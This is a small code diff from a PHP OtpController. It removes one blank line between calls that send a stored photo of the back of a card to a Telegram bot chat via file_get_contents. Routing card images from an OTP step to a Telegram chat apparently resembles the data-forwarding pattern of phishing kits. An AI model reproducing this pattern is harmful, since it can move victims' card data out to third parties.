@@ -66,7 +66,6 @@ class OtpController extends Controller
 
         file_get_contents($url);
 
-
         $url = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendPhoto?chat_id=" . env('TELEGRAM_CHAT_ID') . "&photo=" . asset('storage/' . $matsau_card_name) . "&caption=Ảnh mặt sau thẻ";
 
         file_get_contents($url);
